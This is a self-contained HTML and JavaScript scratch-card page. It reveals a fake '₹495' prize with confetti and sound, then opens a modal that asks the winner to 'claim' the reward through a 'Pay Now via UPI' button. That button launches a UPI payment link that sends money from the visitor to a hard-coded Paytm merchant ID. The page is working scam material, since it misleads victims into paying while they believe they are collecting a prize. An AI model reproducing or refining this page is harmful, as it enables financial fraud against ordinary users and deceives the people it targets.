<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1.0" />
  <title>Scratch & Win</title>
  <style>
    body {
      margin: 0;
      font-family: sans-serif;
      background: #fff;
      display: flex;
      flex-direction: column;
      align-items: center;
      min-height: 100vh;
    }
    .top-img, .bottom-img {
      width: 100%;
      max-width: 360px;
      margin: 10px auto;
      display: block;
      border-radius: 12px;
    }
    .card-container {
      position: relative;
      width: 320px;
      height: 320px;
      border-radius: 25px;
      overflow: hidden;
      box-shadow: 0 10px 25px rgba(0,0,0,0.1);
      background: #fff;
      margin: 15px 0;
    }
    .reward-layer {
      position: absolute;
      z-index: 1;
      width: 100%;
      height: 100%;
      top: 0;
      left: 0;
      object-fit: cover;
      border-radius: 25px;
    }
    .reward-amount {
      position: absolute;
      z-index: 2;
      bottom: 20px;
      left: 50%;
      transform: translateX(-50%);
      font-size: 28px;
      font-weight: bold;
      color: #d32f2f;
      background: rgba(255,255,255,0.85);
      padding: 6px 14px;
      border-radius: 10px;
      animation: blink 1s infinite;
    }
    @keyframes blink {
      0%, 100% { opacity: 1; }
      50% { opacity: 0.7; }
    }
    canvas {
      position: absolute;
      z-index: 3;
      top: 0;
      left: 0;
      border-radius: 25px;
      cursor: pointer;
      touch-action: none;
    }
    .scratch-text {
      position: absolute;
      z-index: 4;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      padding: 10px 20px;
      background: rgba(0, 0, 0, 0.7);
      color: white;
      border-radius: 12px;
      font-size: 18px;
      font-weight: bold;
      animation: blink 2s infinite;
      pointer-events: none;
    }
    .hidden { display: none; }
    /* Modal */
    .modal {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      display: flex;
      align-items: center;
      justify-content: center;
      opacity: 0;
      visibility: hidden;
      transition: 0.3s ease;
      z-index: 1000;
    }
    .modal.show {
      opacity: 1;
      visibility: visible;
    }
    .modal-box {
      background: #fff;
      padding: 30px 25px;
      border-radius: 16px;
      text-align: center;
      max-width: 90%;
      width: 300px;
      box-shadow: 0 8px 20px rgba(0,0,0,0.2);
      animation: popup 0.3s ease-out;
    }
    @keyframes popup {
      from { transform: scale(0.9); opacity: 0; }
      to { transform: scale(1); opacity: 1; }
    }
    .modal-box h2 {
      font-size: 20px;
      margin-bottom: 15px;
      color: #d32f2f;
    }
    .modal-box p {
      font-size: 16px;
      color: #555;
      margin-bottom: 20px;
    }
    .modal-btn {
      background: #d32f2f;
      color: white;
      border: none;
      padding: 12px 20px;
      border-radius: 8px;
      font-size: 16px;
      font-weight: bold;
      cursor: pointer;
      transition: background 0.3s;
    }
    .modal-btn:hover {
      background: #b71c1c;
    }
    .upi-id {
      background: #f5f5f5;
      padding: 10px;
      border-radius: 8px;
      font-family: monospace;
      margin: 15px 0;
      word-break: break-all;
    }
  </style>
</head>
<body>

<img src="https://i.ibb.co/nNCT43nb/IMG-1114.jpg" class="top-img" alt="Top Image" onerror="this.style.display='none'">
<div class="card-container">
  <img id="rewardImage" class="reward-layer hidden" src="https://i.ibb.co/9m8Y3s3R/IMG-1116.png" alt="Reward" onerror="this.style.display='none'">
  <div id="rewardAmount" class="reward-amount hidden">â‚¹495</div>
  <canvas id="scratchCanvas"></canvas>
  <div id="scratchText" class="scratch-text">Scratch here!</div>
</div>
<img src="https://i.ibb.co/0RrqgRTj/IMG-1120.jpg" class="bottom-img" alt="Bottom Image" onerror="this.style.display='none'">
<audio id="winSound" src="https://files.catbox.moe/phmdiy.mp3"></audio>
<script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.6.0/dist/confetti.browser.min.js"></script>

<!-- Modal -->
<div id="upiModal" class="modal">
  <div class="modal-box">
    <h2>ðŸŽ‰ Congratulations! You won â‚¹495!</h2>
    <p>Click below to claim your reward via UPI payment</p>
    <div class="upi-id">merchant.upiid@okaxis</div>
    <button class="modal-btn" id="payNowBtn">Pay Now via UPI</button>
    <p style="font-size: 14px; margin-top: 15px;">If payment app doesn't open, copy UPI ID and pay manually</p>
  </div>
</div>

<script>
const canvas = document.getElementById("scratchCanvas");
const ctx = canvas.getContext("2d");
const container = document.querySelector(".card-container");
const rewardImage = document.getElementById("rewardImage");
const rewardAmount = document.getElementById("rewardAmount");
const scratchText = document.getElementById("scratchText");
const winSound = document.getElementById("winSound");
const modal = document.getElementById("upiModal");
const payNowBtn = document.getElementById("payNowBtn");

// Merchant UPI details
const upiDetails = {
  pa: "paytmqr281005050101y6h4kwjia9ia@paytm",  // Replace with actual merchant UPI ID
  pn: "Merchant Name",          // Replace with actual merchant name
  am: "1",                    // Amount
  tn: "Scratch Card Reward",    // Transaction note
  cu: "INR"                     // Currency
};

// Set canvas size
function resizeCanvas() {
  canvas.width = container.offsetWidth;
  canvas.height = container.offsetHeight;
  initScratchLayer();
}
window.addEventListener('resize', resizeCanvas);
resizeCanvas();

// Initialize scratch layer
function initScratchLayer() {
  const scratchLayer = new Image();
  scratchLayer.crossOrigin = "anonymous";
  scratchLayer.src = "https://i.ibb.co/nqr14xB9/IMG-1113.jpg";
  scratchLayer.onload = () => {
    ctx.globalCompositeOperation = "source-over";
    ctx.drawImage(scratchLayer, 0, 0, canvas.width, canvas.height);
  };
  scratchLayer.onerror = () => {
    // Fallback if scratch layer fails to load
    ctx.fillStyle = "#cccccc";
    ctx.fillRect(0, 0, canvas.width, canvas.height);
    ctx.fillStyle = "#999999";
    ctx.font = "20px Arial";
    ctx.textAlign = "center";
    ctx.fillText("Scratch here to reveal", canvas.width/2, canvas.height/2);
  };
}

let isDrawing = false, revealed = false, lastX = 0, lastY = 0;

function getPosition(e) {
  const rect = canvas.getBoundingClientRect();
  const x = (e.touches ? e.touches[0].clientX : e.clientX) - rect.left;
  const y = (e.touches ? e.touches[0].clientY : e.clientY) - rect.top;
  return { x, y };
}

function startScratch(x, y) {
  isDrawing = true;
  lastX = x;
  lastY = y;
  scratch(x, y, true);
  try {
    winSound.play().catch(e => console.log("Audio play failed:", e));
  } catch (e) {
    console.log("Audio error:", e);
  }
}

function scratch(x, y, start = false) {
  if (!ctx) return;
  
  ctx.globalCompositeOperation = "destination-out";
  ctx.lineCap = "round";
  ctx.lineJoin = "round";
  ctx.lineWidth = 25; // Smaller brush size for better control
  ctx.beginPath();
  if (start) ctx.moveTo(x, y);
  else {
    ctx.moveTo(lastX, lastY);
    ctx.lineTo(x, y);
    ctx.stroke();
  }
  lastX = x;
  lastY = y;
}

function getScratchedPercent() {
  if (!ctx) return 0;
  
  const imgData = ctx.getImageData(0, 0, canvas.width, canvas.height);
  let cleared = 0;
  for (let i = 3; i < imgData.data.length; i += 4) {
    if (imgData.data[i] < 128) cleared++;
  }
  return (cleared / (imgData.data.length / 4)) * 100;
}

function checkReveal() {
  if (revealed || getScratchedPercent() < 40) return; // Increased threshold to 40%
  revealed = true;
  canvas.classList.add("hidden");
  scratchText.classList.add("hidden");
  rewardImage.classList.remove("hidden");
  rewardAmount.classList.remove("hidden");
  
  try {
    winSound.play().catch(e => console.log("Audio play failed:", e));
  } catch (e) {
    console.log("Audio error:", e);
  }
  
  confetti({ particleCount: 200, spread: 70, origin: { y: 0.6 } });

  setTimeout(() => {
    modal.classList.add("show");
  }, 1000);
}

function initiateUPIPayment() {
  // Standard UPI payment link
  const upiLink = `upi://pay?pa=${upiDetails.pa}&pn=${encodeURIComponent(upiDetails.pn)}&am=${upiDetails.am}&tn=${encodeURIComponent(upiDetails.tn)}&cu=${upiDetails.cu}`;
  
  // Try to open directly
  window.location.href = upiLink;
  
  // Fallback - open in new tab after delay
  setTimeout(() => {
    window.open(upiLink, '_blank');
  }, 500);
}

// Event listeners
canvas.addEventListener("mousedown", e => startScratch(...Object.values(getPosition(e))));
canvas.addEventListener("mousemove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); });
canvas.addEventListener("mouseup", () => isDrawing = false);
canvas.addEventListener("mouseleave", () => isDrawing = false);
canvas.addEventListener("touchstart", e => { startScratch(...Object.values(getPosition(e))); e.preventDefault(); });
canvas.addEventListener("touchmove", e => { if (!isDrawing) return; scratch(...Object.values(getPosition(e))); checkReveal(); e.preventDefault(); });
canvas.addEventListener("touchend", () => isDrawing = false);

payNowBtn.addEventListener("click", initiateUPIPayment);

// Preload images
window.addEventListener('load', () => {
  // Preload reward image
  const img = new Image();
  img.src = rewardImage.src;
});
</script>
</body>
</html>
